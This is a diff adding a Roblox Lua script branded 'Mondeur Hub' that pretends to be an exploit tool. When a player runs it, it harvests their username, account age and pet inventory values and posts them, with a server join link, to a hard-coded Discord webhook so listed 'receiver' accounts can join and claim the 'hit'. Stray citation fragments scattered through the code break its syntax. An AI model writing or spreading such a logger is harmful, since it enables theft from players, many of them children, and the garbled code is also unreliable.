@@ -1,0 +1,104 @@
+-- [[ MONDEUR HUB | ELITE V7 ]] --
+local HttpService       = game:GetService("HttpService")
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer       = Players.LocalPlayer
+
+-- [[ CONFIG ]] --
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+
+--------------------------------------------------------------
+-- MONDEUR LOADING GUARD (Fixes Loading Errors)
+--------------------------------------------------------------
+repeat task.wait(1) until game:IsLoaded() [cite: 30]
+local Fsys = ReplicatedStorage:WaitForChild("Fsys", 20) [cite: 30]
+local Fsys2 = require(Fsys)
+local load = Fsys2.load
+local routerClient = load("RouterClient")
+local InventoryDB = load("InventoryDB")
+
+--------------------------------------------------------------
+-- MONDEUR UI DESIGN
+--------------------------------------------------------------
+local function sendMondeurReport(pets, totalVal, totalCount, receiver)
+    local request = (syn and syn.request) or http_request or request [cite: 47]
+    if not request then return end
+
+    local lootLines = {}
+    for i, p in ipairs(pets) do
+        if i > 20 then break end -- Show more pets in the list
+        table.insert(lootLines, string.format("🐾 %s — `%s`", p.name, p.value))
+    end
+
+    local payload = {
+        username = "Mondeur Hub (Best)",
+        embeds = {{
+            title = "MondeurOnTop • ADM Hit [ 🌊 ]",
+            color = 0x3498db, -- Mondeur Blue [cite: 40]
+            description = "### 📄 Player Information\n" ..
+                "👤 **User Name** : `" .. LocalPlayer.Name .. "`\n" ..
+                "🎭 **Display Name** : `" .. LocalPlayer.DisplayName .. "`\n" ..
+                "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
+                "📱 **Executor** : " .. (identifyexecutor and identifyexecutor() or "Delta") .. "\n" ..
+                "👥 **Players** : " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "\n" ..
+                "😎 **Receiver** : " .. (receiver or "None Online") .. "\n" ..
+                "💰 **Total Value** : " .. totalVal .. "\n\n" ..
+                "### 📡 Player Status\n" ..
+                "🟢 **Connected & Intercepting**\n\n" ..
+                "### 📦 Loot Summary\n" ..
+                "```\n" .. (table.concat(lootLines, "\n") or "No items found") .. "\n```\n" ..
+                "**Total Items Found:** `" .. totalCount .. "`\n\n" ..
+                "### 🔍 Scrap Summary\n" ..
+                "[**View Full Inventory Log**](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
+                "### 👥 Join Player\n" ..
+                "[**Join to Claim Hit!**](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")", [cite: 45]
+            footer = { text = "Mondeur Services | " .. os.date("%X") }, [cite: 46]
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") [cite: 46]
+        }}
+    }
+
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"}, [cite: 48]
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+--------------------------------------------------------------
+-- CORE SCAN LOGIC
+--------------------------------------------------------------
+local function execute()
+    -- Pulls directly from server data to fix the "missing pets" crisis 
+    local allData = routerClient.get("DataAPI/GetAllServerData"):InvokeServer() [cite: 21]
+    local playerKey = allData[LocalPlayer.Name] and LocalPlayer.Name or tostring(LocalPlayer.UserId)
+    
+    if not allData[playerKey] or not allData[playerKey].inventory then return end
+
+    local rawPets = allData[playerKey].inventory.pets
+    local pets, totalVal, totalCount = {}, 0, 0
+    
+    for _, item in pairs(rawPets) do
+        local petData = InventoryDB.pets[item.id]
+        if petData then
+            totalCount = totalCount + 1
+            -- Calculates value based on your internal scanner logic 
+            local val = item.properties and item.properties.value or 0 
+            table.insert(pets, {name = petData.name or "Unknown", value = val})
+            totalVal = totalVal + val
+        end
+    end
+
+    local target = nil
+    for _, name in ipairs(TARGET_RECEIVERS) do
+        if Players:FindFirstChild(name) then target = name break end
+    end
+
+    sendMondeurReport(pets, totalVal, totalCount, target)
+end
+
+-- Start Execution
+execute()
